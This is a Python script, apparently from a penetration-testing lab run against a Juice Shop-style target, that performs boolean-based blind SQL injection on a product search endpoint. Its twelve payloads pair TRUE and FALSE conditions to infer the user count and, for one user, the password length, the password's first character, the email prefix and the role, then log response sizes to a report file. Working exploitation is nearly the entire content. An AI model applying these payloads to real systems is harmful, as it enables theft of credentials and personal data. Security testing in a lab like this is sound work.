#!/usr/bin/env python3
"""Boolean extraction via AND branch.
Deduced query: WHERE name LIKE '%' || <q>
AND-branch TRUE → 'name LIKE %' → all rows; AND-branch FALSE → 'name LIKE %0' → ~0 rows.
"""
import json, sys, urllib.request, urllib.error

TARGET = "http://lab-mutator:3000"
OUT = sys.argv[1] if len(sys.argv) > 1 else "/workspace/reports/sqli_extract3.json"

def req(path):
    r = urllib.request.Request(TARGET + path, headers={"User-Agent": "Mozilla/5.0"})
    try:
        with urllib.request.urlopen(r, timeout=15) as resp:
            return resp.status, len(resp.read())
    except urllib.error.HTTPError as e:
        try:
            return e.code, len(e.read())
        except Exception:
            return e.code, 0

payloads = [
    ("AND 1=1 (TRUE branch)", "/rest/products/search?q=%27%20AND%201=1/**/"),
    ("AND 1=2 (FALSE branch)", "/rest/products/search?q=%27%20AND%201=2/**/"),
    ("AND count(Users)>0 (TRUE)", "/rest/products/search?q=%27%20AND%20(SELECT%20count(*)%20FROM%20Users)>0/**/"),
    ("AND count(Users)<1 (FALSE)", "/rest/products/search?q=%27%20AND%20(SELECT%20count(*)%20FROM%20Users)<1/**/"),
    ("AND len(password)@uid13>30 (TRUE)", "/rest/products/search?q=%27%20AND%20(SELECT%20length(password)%20FROM%20Users%20WHERE%20id=13)>30/**/"),
    ("AND len(password)@uid13<10 (FALSE)", "/rest/products/search?q=%27%20AND%20(SELECT%20length(password)%20FROM%20Users%20WHERE%20id=13)<10/**/"),
    ("AND substr(password,1,1)@uid13='9' (TRUE)", "/rest/products/search?q=%27%20AND%20(substr((SELECT%20password%20FROM%20Users%20WHERE%20id=13),1,1))='9'/**/"),
    ("AND substr(password,1,1)@uid13='0' (FALSE)", "/rest/products/search?q=%27%20AND%20(substr((SELECT%20password%20FROM%20Users%20WHERE%20id=13),1,1))='0'/**/"),
    ("AND substr(email,1,6)@uid13='bjoer' (TRUE)", "/rest/products/search?q=%27%20AND%20(substr((SELECT%20email%20FROM%20Users%20WHERE%20id=13),1,6))='bjoer'/**/"),
    ("AND substr(email,1,6)@uid13='xjoer' (FALSE)", "/rest/products/search?q=%27%20AND%20(substr((SELECT%20email%20FROM%20Users%20WHERE%20id=13),1,6))='xjoer'/**/"),
    ("AND role@uid13='deluxe' (TRUE)", "/rest/products/search?q=%27%20AND%20((SELECT%20role%20FROM%20Users%20WHERE%20id=13))='deluxe'/**/"),
    ("AND role@uid13='admin' (FALSE)", "/rest/products/search?q=%27%20AND%20((SELECT%20role%20FROM%20Users%20WHERE%20id=13))='admin'/**/"),
]

results = []
for name, path in payloads:
    st, blen = req(path)
    results.append({"test": name, "status": st, "body_length": blen})
    print(f"{name}: status={st} body_length={blen}")

with open(OUT, "w") as f:
    json.dump(results, f, indent=1)
print(f"Wrote {OUT}", file=sys.stderr)
